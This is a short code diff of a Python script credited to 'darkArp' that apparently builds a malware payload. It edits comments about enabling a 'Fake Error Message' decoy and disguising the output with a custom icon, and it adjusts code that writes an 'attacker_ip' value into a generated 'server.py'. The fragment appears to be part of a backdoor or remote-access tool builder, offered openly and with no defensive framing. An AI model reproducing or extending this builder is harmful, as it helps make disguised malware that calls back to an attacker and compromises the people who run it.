@@ -1,6 +1,7 @@
 #Created by darkArp. For more info check the instructions text file. MarioNascimento@ITCrashSecurity.com
 #Contains test code to be cleaned up
-#To activate Fake Error Message uncomment line 147
+#To activate Fake Error Message uncomment line 14
+#To include custom icon, place the icon of choice in the same directory as this script and rename it "icon.ico"
 import os, socket
 import sys
 import cgi
@@ -50,7 +51,7 @@ def py2crypt():
 with open('create_server.py') as f1:
     with open('server.py', 'w') as f2:
         lines = f1.readlines()
-        i = 61
+        i = 63
         f2.write("global attacker_ip\nattacker_ip = " + '\'' + attacker_ip + '\'' + '\n')
         while(i<len(lines)-1):
             f2.write(lines[i])
